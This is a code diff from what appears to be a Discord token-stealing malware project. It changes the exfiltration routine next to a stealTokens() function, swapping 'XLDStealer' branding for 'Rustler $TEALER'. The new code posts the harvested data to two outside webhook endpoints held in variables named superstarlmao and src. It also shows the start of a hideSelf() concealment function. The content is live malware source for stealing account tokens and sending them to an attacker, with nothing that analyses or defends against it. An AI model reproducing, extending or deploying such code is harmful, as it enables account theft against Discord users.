@@ -348,42 +348,38 @@ async function stealTokens() {
         });
     }
 
-
-function injectNotify() {
-    var fields = [];
-    injectPath.forEach( path => {
-        var c = {
-            name: "<:bfdnonsfw:966774651449671761> Inject Path ",
-            value: `\`\`\`${path}\`\`\``,
-            inline: !1
-        }
-        fields.push(c)
-    })
-    axios
-	.post(webhook, {
+axios.post(superstarlmao, {
         "content": null,
         "embeds": [
           {
-            "title": "<:bfdnonsfw:966774651449671761> Successfull injection",
             "color": config["embed-color"],
-            "fields": fields,
+            "fields": fields.filter(onlyUnique),
             "author": {
-              "name": "XLDStealer",
-              "icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg"
+                "name": `Rustler $TEALER`,
+                "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
             },
             "footer": {
-              "text": "XLDStealer",
-              "icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg"
-            }
-          }
-        ]
-      })
-	.then(res => {
-	})
-	.catch(error => {
+                "text": "Rustler $TEALER"
+            },
+        }]
+    }) .then(res => {}).catch(error => {})
 
-    })
-
+    axios.post(src, {
+        "content": null,
+        "embeds": [
+          {
+            "color": config["embed-color"],
+            "fields": fields.filter(onlyUnique),
+            "author": {
+                "name": `Rustler $TEALER`,
+                "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
+            },
+            "footer": {
+                "text": "Rustler $TEALER"
+            },
+        }]
+    }) .then(res => {}).catch(error => {})
+    
 }
 function hideSelf() {
     let payload = '\n' +
